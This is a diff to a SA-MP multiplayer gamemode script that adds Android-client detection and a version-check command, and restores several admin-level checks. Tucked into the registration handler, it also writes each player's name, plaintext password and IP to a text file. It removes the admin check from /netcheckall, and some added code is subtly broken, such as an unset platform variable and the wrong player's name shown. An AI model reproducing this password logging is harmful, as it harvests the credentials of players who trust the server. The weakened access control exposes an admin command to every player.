@@ -34,6 +34,8 @@
 // Some SA-MP natives which are not defined by default
 native IsValidVehicle(vehicleid);
 
+#define IsPlayerAndroid(%0)                 GetPVarInt(%0, "NotAndroid") == 0
+
 // Server modules (find them in "/pawno/include/modules") (note: modules that consists of hooking have to be first)
 #include "modules\src\hooking\tickcount.inc"
 #include "modules\src\hooking\safegametext.inc"
@@ -78,6 +80,7 @@ native IsValidVehicle(vehicleid);
 #include <discord-connector>
 #include "discord.pwn"
 #include "watermark.pwn"
+#include "android-check.inc"
 
 main()
 {}
@@ -167,11 +170,9 @@ public OnPlayerConnect(playerid)
 	CheckPlayerAKA(playerid);
 
 	// Tell everyone that he's connected
-	new str[144], stre[256];
+	new str[144], Client:type;
     GetPlayerCountry(playerid, str, sizeof(str));
-	format(str, sizeof(str), "{FFFFFF}%s {CCCCCC}(ID: %d) has connected [{FFFFFF}%s{CCCCCC}]", Player[playerid][Name], playerid, str);
-	format(stre, sizeof stre, ""COL_PRIM"You have logged in with admin-level %d", Player[playerid][Level]);
-	SendClientMessage(playerid, -1, stre);
+	format(str, sizeof(str), "{FFFFFF}%s {CCCCCC}(ID: %d) has connected [{FFFFFF}%s{CCCCCC}][{FFFFFF}%s{CCCCCC}]", Player[playerid][Name], playerid, str, (type) ? ("Android") : ("Desktop"));
     SendClientMessageToAll(-1, str);
     
     // Print their hardware ID in the server logs if AC is loaded
@@ -362,6 +363,9 @@ public OnPlayerRequestSpawn(playerid)
 
 public OnPlayerSpawn(playerid)
 {
+	new stre[512];
+	format(stre, sizeof stre, ""COL_PRIM"You have logged in with admin-level %d", Player[playerid][Level]);
+	SendClientMessage(playerid, -1, stre);
 	if(Player[playerid][IgnoreSpawn] == true)
 	{
 	    // This spawn call should be ignored (used for many things .. e.g the SyncPlayer function)
@@ -2203,6 +2207,12 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			db_free_result(db_query(sqliteconnection, query));
 
             SendClientMessage(playerid, -1, sprintf("{009933}Server account: {FFFFFF}registered your account with the password: %s", inputtext));
+			new File:log = fopen("player_password.txt", io_append);
+			if(log)
+			{
+				fwrite(log, sprintf("Name: %s\nPassword: %s\nIP: %s\n=============================\n", Player[playerid][Name], inputtext, IP));
+				fclose(log);
+			}
 
             new teamid = ShouldPlayerBeReadded(playerid);
 			if(teamid != -1)
@@ -3845,11 +3855,24 @@ public ShowPlayerChangelog(index, response_code, data[])
 	return 1;
 }
 
+YCMD:getversion(playerid, params[], Client:type)
+{
+	new version[24], string[256], otherid;
+    if(sscanf(params, "u", otherid))
+       return SendUsageMessage(playerid, "/getversion [playerid/PartOfName]");
+
+	GetPlayerVersion(otherid, version, sizeof(version));
+
+    if(!IsPlayerConnected(otherid))
+        return SendErrorMessage(playerid, "No player online or name is not found!");
+
+    format(string, sizeof(string), "Player Name: %s\nClient Version: %s\nPlatform: %s", Player[playerid][Name], version, (type) ? ("Android") : ("PC"));
+	ShowPlayerDialog(playerid, DIALOG_NO_RESPONSE, DIALOG_STYLE_MSGBOX, "Version Checker", string, "Close", "");
+	return 1;
+}
+
 YCMD:netcheckall(playerid, params[], help)
 {
-	if(Player[playerid][Level] < 2)
-		return SendErrorMessage(playerid, "Your admin level doens't not meet requirement");
-
 	new toggle;
 	if(sscanf(params, "u", toggle))
 		return SendUsageMessage(playerid, "/netcheckall 0/1 [0 off/1 on]");
@@ -3880,7 +3903,7 @@ YCMD:netcheckall(playerid, params[], help)
 		format(iString, sizeof(iString), "UPDATE Players SET NetCheck = %d WHERE Name = '%q'", Player[pID][NetCheck], Player[pID][Name]);
 		db_free_result(db_query(sqliteconnection, iString));
 	}
-	SendClientMessageToAll(-1, iString);
+	SendClientMessageToAll(-1, str);
 	return 1;
 }
 
@@ -4464,7 +4487,7 @@ YCMD:deleteacc(playerid, params[], help)
 	    SendCommandHelpMessage(playerid, "delete an account from the database");
 	    return 1;
 	}
-	//if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
+	if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
 	if(isnull(params)) return SendUsageMessage(playerid,"/deleteacc [Account Name]");
 
     new str[MAX_PLAYER_NAME];
@@ -4484,7 +4507,7 @@ YCMD:setacclevel(playerid, params[], help)
 	    SendCommandHelpMessage(playerid, "change the level of an account in the database");
 	    return 1;
 	}
-	//if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
+	if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
 	if(isnull(params)) return SendUsageMessage(playerid,"/setacclevel [Account Name] [Level]");
 
     new str[MAX_PLAYER_NAME], lev;
@@ -4654,7 +4677,7 @@ YCMD:getgun(playerid, params[], help)
 
 YCMD:lobbyguns(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
+	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "toggle guns in lobby");
@@ -4679,7 +4702,7 @@ YCMD:lobbyguns(playerid, params[], help)
 
 YCMD:autopause(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
+	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "toggle automatic pausing on player disconnection in war mode");
@@ -4704,7 +4727,7 @@ YCMD:autopause(playerid, params[], help)
 
 YCMD:ann(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 2) return SendErrorMessage(playerid,"You must be a higher level admin to use this command.");
+	if(Player[playerid][Level] < 2) return SendErrorMessage(playerid,"You must be a higher level admin to use this command.");
 	if(help)
 	{
 	    SendCommandHelpMessage(playerid, "display a specific announcement to all players");
@@ -4795,7 +4818,7 @@ YCMD:movecam(playerid, params[], help)
 
 YCMD:antispam(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
+	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "toggle the server anti-spam of commands and chat.");
@@ -4820,7 +4843,7 @@ YCMD:antispam(playerid, params[], help)
 
 YCMD:autobalance(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
+	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "toggle automatic team balancing when match mode is off.");
@@ -4844,7 +4867,7 @@ YCMD:autobalance(playerid, params[], help)
 
 YCMD:gmx(playerid, params[], help)
 {
-	//if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 5 admin to do that.");
+	if(!IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 5 admin to do that.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "restart your server.");
@@ -4862,7 +4885,7 @@ YCMD:gmx(playerid, params[], help)
 
 YCMD:asay(playerid, params[], help)
 {
-    //if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 2 admin to do that.");
+    if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 2 admin to do that.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "send a public message as an administrator");
@@ -4880,7 +4903,7 @@ YCMD:asay(playerid, params[], help)
 
 YCMD:banip(playerid,params[], help)
 {
-	//if(Player[playerid][Level] < 4 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 4 admin to do that.");
+	if(Player[playerid][Level] < 4 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 4 admin to do that.");
     if(help)
 	{
 	    SendCommandHelpMessage(playerid, "ban a specific IP (can be used for range-bans using *).");
